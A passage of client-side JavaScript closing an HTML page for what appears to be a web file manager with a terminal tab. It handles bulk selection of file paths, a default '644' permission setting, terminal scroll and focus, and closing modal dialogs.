                    const path = checkbox.getAttribute('data-path');
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = `selected_items[${index}]`;
                    input.value = path;
                    container.appendChild(input);
                });
                form.submit();
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            setBulkPermission('644');
            const terminalOutput = document.getElementById('terminalOutput');
            if (terminalOutput) {
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            if (window.location.href.includes('tab=terminal')) {
                const terminalInput = document.getElementById('terminalInput');
                if (terminalInput) {
                    terminalInput.focus();
                }
            }
            window.onclick = function(event) {
                if (event.target.classList.contains('modal')) {
                    event.target.style.display = 'none';
                }
            };
            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    const modals = document.querySelectorAll('.modal');
                    modals.forEach(modal => {
                        modal.style.display = 'none';
                    });
                }
            });
        });
    </script>
</body>
</html>